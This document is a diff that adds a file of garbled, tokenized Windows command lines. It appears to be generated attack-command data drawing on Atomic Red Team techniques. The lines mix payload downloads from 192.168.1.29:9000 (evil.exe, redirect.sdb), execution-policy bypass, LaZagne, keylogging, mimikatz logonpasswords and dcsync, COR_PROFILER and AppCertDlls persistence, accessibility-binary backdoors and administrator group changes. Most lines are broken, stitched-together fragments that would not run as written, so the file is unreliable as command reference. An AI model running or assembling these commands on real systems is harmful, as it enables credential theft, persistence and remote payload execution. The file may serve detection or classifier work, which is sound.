@@ -1,0 +1,64 @@
+powershell -executionpolicy bypass -command administrators '' /f
+get-ciminstance http : os ; -n = :utf8.getstring http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+conhost.exe namp -sn $ target t1547.009 \windows\system32\spool\prtprocs\x64\atomictest.dll
+net localgroup administrators '' \programdata\microsoft\windows\start packages ''
+rdrleakdiag.exe /p keylog
+winrar a -ibck -name fuzz. ''
+gobuster dir /create
+iediagcmd.exe /out '' $ { intput_file_name }
+net localgroup `` { cor_profiler c '' /v security packages '' /f
+copy `` .\lazagne //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+esentutl.exe /y /grant $ `` user_name '' '' ''
+set-executionpolicy -executionpolicy bypass -scope -- -command $ '' /format '' '' /t 1
+bitsadmin.exe /create $ `` domain admins '' ''
+iediagcmd.exe -o `` $ wscriptshell.createshortcut autorun $ { user_name } -accepteula `` $ { filename_regex }
+rundll32 popcalc.dll , keylog
+net localgroup `` administrators '' /t cor_profiler '' /grant threadingmodel '' ''
+net localgroup `` administrators '' /t reg_dword /v cor_profiler ''
+net localgroup `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /t reg_dword /d inputprovider ''
+get-keystrokes
+reg add `` domain c : domain : cor_profiler /grant administrators ''
+copy .\lazagne -f http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+rdrleakdiag.exe /p $ target t1547.009 x64\print windir ; c : /export ; -t $ consumerargs = @ `` hklm\system\currentcontrolset\control\session file \programdata\microsoft\windows\start temp % \programdata\microsoft\windows\start \system32\osk.exe /grant administrators '' -name $ : /v cor_profiler '' c : loadappinit_dlls '' ''
+copy /o '' '' /t reg_sz /f /grant administrators ''
+net localgroup `` administrators '' '' c '' nt\currentversion\image file c administrators '' c administrators '' '' -namespace '' -namespace -class objws file -name '' minidump execution packages '' $ true
+invoke-screencap = `` '' c : cor_profiler /grant http http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` security cor_profiler_path /grant administrators '' '' , keylog
+cmdkey /list
+powershell -executionpolicy bypass
+bitsadmin.exe /create $ `` $ t1547.009 -namespace hklm\software\microsoft\windows cor_profiler '' -l '' -name $ : threadingmodel '' ''
+auditpol http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` hklm\software\microsoft\windows registry_name c : cor_profiler '' '' \windows\system32\sethc_backup.exe
+$ shortcut = `` createobject ( `` http : os ; name , http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+`` http : :securityprotocol \\ ( $ /r = new-object net.webclient localappdata ; ; -t c : \microsoft\teams\current\teams.exe
+net localgroup `` # : reg_dword -ibck
+$ shortcut.targetpath= '' '' \inprocserver32 , threadingmodel '' -name .\ '' /t set-service , threadingmodel '' ''
+net localgroup `` users ''
+host `` $ { user_name } \inprocserver32 , -command '' threadingmodel '' ''
+$ `` hkcu\software\classes\clsid\ shell t1547.009 /nowrap ''
+takeown /f \\ : http : :logonpasswords
+quser
+silentrunner.exe $ target '' /f
+rdrleakdiag.exe /p domain
+$ `` hklm\system\currentcontrolset\services\ = `` .\ { command } '' t1547.009 -verbose ''
+iediagcmd.exe /out /f /grant administrators '' $ { cor_enable_profiling '' , threadingmodel '' -name $ : threadingmodel '' ''
+rundll32.exe \\ $ target ) t1547.009 /user ( set-wmiinstance -namespace cor_profiler /grant administrators '' c '' c cor_profiler '' c c '' c administrators '' \programdata\microsoft\windows\start packages '' /f
+vsiisexelauncher.exe -p [ where \microsoft\teams\current\teams.exe
+powershell -executionpolicy bypass in : '' -name threadingmodel '' /t threadingmodel
+get-ciminstance -classname win32_processor | select-object -expandproperty bits_job_name
+ffuf -w } -l $ { dns } -t $ profile
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o admins $ : powershell `` `` http : :logonpasswords username= $ : ; -t $ '' nt\currentversion\winlogon\notify\atomicredteam '' /t -name `` cor_profiler '' , threadingmodel '' c $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ''
+bitsadmin.exe /create $ `` -d t1547.009 volumn mainwindowtitle
+net localgroup administrators `` '' `` cor_profiler , threadingmodel '' /grant threadingmodel ''
+esentutl.exe /y $ `` cor_profiler = '' /t threadingmodel ''
+% localappdata % \system32\osk.exe } '
+net localgroup `` hklm\system\currentcontrolset\control\session manager\environment '' \programdata\microsoft\windows\start manager\appcertdlls '' \programdata\microsoft\windows\start packages '' ''
+`` http : -r /user : \software\microsoft\command \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' '' '' \programdata\microsoft\windows\start file c : packages '' ''
+reg add `` nt\currentversion\winlogon\notify\atomicredteam '' /f /grant -s threadingmodel /grant windir c administrators '' '' -name cor_profiler ''
+% localappdata % \microsoft\teams\current\teams.exe
+[ myprocess ] : :securityprotocol \\ $ http : name='atomicredteam-wmipersistence-activescripteventconsumer-example \\ = $ shell.createshortcut ( `` ; -t $ hklm\software\microsoft\windows nt\currentversion\windows '' ;
+curl http : :dcsync -new profile \\ $ : windir % \system32\osk.exe
+silentrunner.exe $ '' /d 1 /f
+net localgroup `` driver '' /f
+bitsadmin.exe /create $ `` t1547.009 nt\currentversion\windows ''
